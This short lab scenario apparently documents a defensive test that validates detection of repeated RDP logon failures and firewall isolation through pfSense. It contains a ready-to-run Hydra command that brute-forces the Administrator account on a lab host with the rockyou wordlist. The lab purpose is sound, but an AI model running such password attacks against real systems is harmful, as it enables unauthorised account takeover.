# Scenario 2: RDP Brute-Force & Active Response

## 🎯 Objective
Validate automated detection of high-frequency logon failures and Human-in-the-Loop firewall IP isolation via pfSense[cite: 1].

## 💻 Execution Steps
Run Hydra from Linux Attacker (`10.1.0.3`) targeting RDP on Windows Host (`10.1.0.2`)[cite: 1, 3]:
```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.1.0.2 -t 4
